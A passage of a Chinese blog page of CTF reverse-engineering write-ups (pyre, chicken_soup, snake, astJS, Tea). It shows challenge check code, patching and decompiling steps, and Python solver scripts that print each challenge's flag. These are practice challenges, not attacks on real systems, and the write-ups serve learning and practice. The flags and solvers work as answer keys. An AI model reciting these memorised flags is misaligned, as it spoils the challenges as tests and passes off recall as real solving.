keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>input1<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> i<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span> <span class="token operator">+</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">128</span>    code <span class="token operator">+=</span> num<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> code<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token keyword">print</span> codecode <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token string">"%1f"</span><span class="token punctuation">,</span>    <span class="token string">"%12"</span><span class="token punctuation">,</span>    <span class="token string">"%1d"</span><span class="token punctuation">,</span>    <span class="token string">"("</span><span class="token punctuation">,</span>    <span class="token string">"0"</span><span class="token punctuation">,</span>    <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">"%01"</span><span class="token punctuation">,</span>    <span class="token string">"%06"</span><span class="token punctuation">,</span>    <span class="token string">"%14"</span><span class="token punctuation">,</span>    <span class="token string">"4"</span><span class="token punctuation">,</span>    <span class="token string">","</span><span class="token punctuation">,</span>    <span class="token string">"%1b"</span><span class="token punctuation">,</span>    <span class="token string">"U"</span><span class="token punctuation">,</span>    <span class="token string">"?"</span><span class="token punctuation">,</span>    <span class="token string">"o"</span><span class="token punctuation">,</span>    <span class="token string">"6"</span><span class="token punctuation">,</span>    <span class="token string">"*"</span><span class="token punctuation">,</span>    <span class="token string">":"</span><span class="token punctuation">,</span>    <span class="token string">"%01"</span><span class="token punctuation">,</span>    <span class="token string">"D"</span><span class="token punctuation">,</span>    <span class="token string">";"</span><span class="token punctuation">,</span>    <span class="token string">"%"</span><span class="token punctuation">,</span>    <span class="token string">"%13"</span><span class="token punctuation">,</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-26"><a class="markdownIt-Anchor" href="#exp-26"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">code <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"\x1f"</span><span class="token punctuation">,</span><span class="token string">"\x12"</span><span class="token punctuation">,</span><span class="token string">"\x1d"</span><span class="token punctuation">,</span><span class="token string">"("</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">"\x01"</span><span class="token punctuation">,</span><span class="token string">"\x06"</span><span class="token punctuation">,</span><span class="token string">"\x14"</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">,</span><span class="token string">","</span><span class="token punctuation">,</span><span class="token string">"\x1b"</span><span class="token punctuation">,</span><span class="token string">"U"</span><span class="token punctuation">,</span><span class="token string">"?"</span><span class="token punctuation">,</span><span class="token string">"o"</span><span class="token punctuation">,</span><span class="token string">"6"</span><span class="token punctuation">,</span><span class="token string">"*"</span><span class="token punctuation">,</span><span class="token string">":"</span><span class="token punctuation">,</span><span class="token string">"\x01"</span><span class="token punctuation">,</span><span class="token string">"D"</span><span class="token punctuation">,</span><span class="token string">";"</span><span class="token punctuation">,</span><span class="token string">"%"</span><span class="token punctuation">,</span><span class="token string">"\x13"</span><span class="token punctuation">,</span><span class="token punctuation">]</span>l<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>code<span class="token punctuation">)</span>code<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> code<span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>code<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">^</span>code<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> code<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token operator">+</span><span class="token number">128</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">128</span><span class="token punctuation">:</span>            flag<span class="token operator">+=</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token comment">#GWHT&#123;Just_Re_1s_Ha66y!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="广东省大学生攻防大赛-2022pyre"><a class="markdownIt-Anchor" href="#广东省大学生攻防大赛-2022pyre"></a> [广东省大学生攻防大赛 2022]pyre</h2><h3 id="题目描述-28"><a class="markdownIt-Anchor" href="#题目描述-28"></a> 题目描述</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">check</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    a <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"plz input your flag:"</span><span class="token punctuation">)</span>    c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span>      <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">33</span> <span class="token operator">%</span> b <span class="token operator">!=</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"wrong"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"win"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="exp-27"><a class="markdownIt-Anchor" href="#exp-27"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">c <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">163</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">177</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">58</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">72</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">111</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">53</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">152</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">,</span> <span class="token number">39</span><span class="token punctuation">,</span> <span class="token number">171</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">91</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">,</span> <span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">158</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">]</span>a<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span>b<span class="token operator">=</span><span class="token number">2</span>i<span class="token operator">=</span><span class="token number">0</span><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> j<span class="token operator">*</span><span class="token number">33</span><span class="token operator">%</span>b <span class="token operator">==</span> c<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                a<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">'flag'</span> <span class="token keyword">in</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125;</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>b<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>   <span class="token comment">#179</span>    b<span class="token operator">+=</span><span class="token number">1</span>    a<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="moectf-2022chicken_soup"><a class="markdownIt-Anchor" href="#moectf-2022chicken_soup"></a> [MoeCTF 2022]chicken_soup</h2><h3 id="题目描述-29"><a class="markdownIt-Anchor" href="#题目描述-29"></a> 题目描述</h3><p>首先进入查壳，在进入到IDA<br />发现有两个加密函数<br />244798<br />进去看一看<br />发现互补跳转的花指令<br />244880<br />接着手动修改花指令，根据跳转的字节大小（为一个字节），外面将跳转后面的一个字节nop(修改为90)掉就ok了<br />245000<br />按p定义函数后按F5就可以看到源代码了：<br />245086<br />另一个加密函数同样的方法操作。<br />接着后面有一个函数点进去看，发现是比较字符串的函数，在内存中找到加密后的密文，注意长度为38.<br />245215<br />拿出来用脚本反向解密拿到flag。</p><h3 id="exp-28"><a class="markdownIt-Anchor" href="#exp-28"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">Array<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">205</span><span class="token punctuation">,</span>  <span class="token number">77</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span> <span class="token number">173</span><span class="token punctuation">,</span>  <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">190</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">125</span><span class="token punctuation">,</span>   <span class="token number">188</span><span class="token punctuation">,</span> <span class="token number">124</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span>  <span class="token number">46</span><span class="token punctuation">,</span>  <span class="token number">42</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span> <span class="token number">106</span><span class="token punctuation">,</span>  <span class="token number">26</span><span class="token punctuation">,</span> <span class="token number">204</span><span class="token punctuation">,</span>    <span class="token number">61</span><span class="token punctuation">,</span>  <span class="token number">74</span><span class="token punctuation">,</span> <span class="token number">248</span><span class="token punctuation">,</span>  <span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">121</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span>  <span class="token number">57</span><span class="token punctuation">,</span> <span class="token number">217</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span> <span class="token number">157</span><span class="token punctuation">,</span>   <span class="token number">169</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">,</span>  <span class="token number">76</span><span class="token punctuation">,</span> <span class="token number">140</span><span class="token punctuation">,</span> <span class="token number">221</span><span class="token punctuation">,</span>  <span class="token number">89</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">]</span><span class="token triple-quoted-string string">'''正向过程第一个函数:flag2[i]=flag[i]+flag[i+1]第二个函数:Array[i]=(16*flag2[i])|flag2[i]>>4  前四位后四位互换'''</span>flag2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> Array<span class="token punctuation">:</span>    flag2<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">0xf0</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">4</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token operator">&amp;</span><span class="token number">0xf</span><span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>Array<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span>flag2<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span>flag2<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span>flag2<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag2<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#moectf&#123;p4tch_pr0gr4m_t0_d3c0mpi1e_it!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="litctf-2023snakepyc文件头修复"><a class="markdownIt-Anchor" href="#litctf-2023snakepyc文件头修复"></a> [LitCTF 2023]snake（pyc文件头修复）</h2><h3 id="题目描述-30"><a class="markdownIt-Anchor" href="#题目描述-30"></a> 题目描述</h3><p>直接反编译发现magic number不对</p><p>python 3.7生成的 pyc 文件前32个字节</p><p>42 0D 0D 0A<br />所以拖进010editor修改前4个字节保存再反编译<br />然后把代码中flag附近的拖出来，转成字符串输出</p><p><a href="https://blog.csdn.net/Zheng__Huang/article/details/112380221">MagicNumber详解</a></p><p>扒出源码后直接运行出flag的代码</p><h3 id="exp-29"><a class="markdownIt-Anchor" href="#exp-29"></a> exp</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">flag <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token number">30</span><span class="token punctuation">,</span> <span class="token number">196</span><span class="token punctuation">,</span>        <span class="token number">52</span><span class="token punctuation">,</span> <span class="token number">252</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">243</span><span class="token punctuation">,</span>        <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">241</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">,</span> <span class="token number">224</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">230</span><span class="token punctuation">,</span>        <span class="token number">25</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span>        <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">225</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">215</span><span class="token punctuation">,</span> <span class="token number">40</span><span class="token punctuation">,</span> <span class="token number">231</span><span class="token punctuation">,</span>        <span class="token number">22</span><span class="token punctuation">,</span> <span class="token number">237</span><span class="token punctuation">,</span> <span class="token number">14</span><span class="token punctuation">,</span> <span class="token number">251</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">169</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token punctuation">,</span>flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> flag<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">136</span><span class="token punctuation">,</span>flag<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token number">119</span>flag<span class="token operator">=</span><span class="token punctuation">[</span><span class="token builtin">chr</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> flag<span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#LitCTF&#123;python_snake_is_so_easy!&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个题有个很坑的地方，pycdc反编译好有错误，flag[i] = flag[i + 1] ^ 136 flag[i + 1] = flag[i] ^ 119</p><p>uncompyle6才能正确反编译成功flag[i] ,flag[i + 1] = flag[i + 1] ^ 136,flag[i] ^ 119</p><p>遇到坑的时候可以两个引擎都试试对照一下</p><h2 id="swpuctf-2021-新生赛astjsjs逆向"><a class="markdownIt-Anchor" href="#swpuctf-2021-新生赛astjsjs逆向"></a> [SWPUCTF 2021 新生赛]astJS(js逆向)</h2><h3 id="题目描述-31"><a class="markdownIt-Anchor" href="#题目描述-31"></a> 题目描述</h3><p>使用 npm 包 <code>escodegen</code> 解密</p><ol><li>安装 escodegen</li></ol><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">npm</span> i escodegen <span class="token parameter variable">-g</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ esgenerate 附件.json<span class="token punctuation">(</span><span class="token function-name function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> bE<span class="token punctuation">(</span>str, key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        var arr <span class="token operator">=</span> str.split<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token builtin class-name">return</span> arr.map<span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>            <span class="token builtin class-name">return</span> String.fromCharCode<span class="token punctuation">(</span>i.charCodeAt<span class="token punctuation">(</span><span class="token punctuation">)</span> ^ key<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>.join<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    console.log<span class="token punctuation">(</span>bE<span class="token punctuation">(</span><span class="token string">'EXXH_Mpjx\x7FBxYnjggrM~eerv'</span>, <span class="token number">11</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>执行语句即可获得 flag</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">node</span>Welcome to Node.js v14.13.1.Type <span class="token string">".help"</span> <span class="token keyword">for</span> <span class="token function">more</span> information.<span class="token operator">></span> <span class="token punctuation">(</span><span class="token function-name function">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span>.     <span class="token keyword">function</span> bE<span class="token punctuation">(</span>str, key<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.         var arr <span class="token operator">=</span> str.split<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.         <span class="token builtin class-name">return</span> arr.map<span class="token punctuation">(</span>i <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">&#123;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.             <span class="token builtin class-name">return</span> String.fromCharCode<span class="token punctuation">(</span>i.charCodeAt<span class="token punctuation">(</span><span class="token punctuation">)</span> ^ key<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.         <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>.join<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">..</span><span class="token punctuation">..</span>.     <span class="token punctuation">&#125;</span><span class="token punctuation">..</span>.     console.log<span class="token punctuation">(</span>bE<span class="token punctuation">(</span><span class="token string">'EXXH_Mpjx\x7FBxYnjggrM~eerv'</span>, <span class="token number">11</span><span class="token punctuation">))</span><span class="token punctuation">;</span><span class="token punctuation">..</span>. <span class="token punctuation">&#125;</span><span class="token punctuation">(</span><span class="token punctuation">))</span><span class="token punctuation">;</span>NSSCTF<span class="token punctuation">&#123;</span>astIsReallyFunny<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="gdouctf-2023tea"><a class="markdownIt-Anchor" href="#gdouctf-2023tea"></a> [GDOUCTF 2023]Tea</h2><h3 id="题目描述-32"><a class="markdownIt-Anchor" href="#题目描述-32"></a> 题目描述</h3><p>题目已经告诉我们这个是一个tea加密</p><p>查壳，无壳，打开ida找flag，交叉引用到主函数</p><h4 id="ida分析"><a class="markdownIt-Anchor" href="#ida分析"></a> IDA分析:</h4><p>通过字符串窗口，我们可以找到字符串&quot;you are right!\n&quot;.交叉引用(X键)到相关函数去.</p><p>字符串所在函数代码:</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_140016230</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 i<span class="token punctuation">;</span> <span class="token comment">// rcx</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-20h] BYREF</span>  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp+0h] BYREF</span>  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp+4h]</span>  <span class="token keyword">int</span> v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+44h] [rbp+24h]</span>  <span class="token keyword">int</span> v7<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp+48h] BYREF</span>  _DWORD v8<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp+78h] BYREF</span>  <span class="token keyword">int</span> v9<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+D8h] [rbp+B8h] BYREF</span>  <span class="token keyword">int</span> 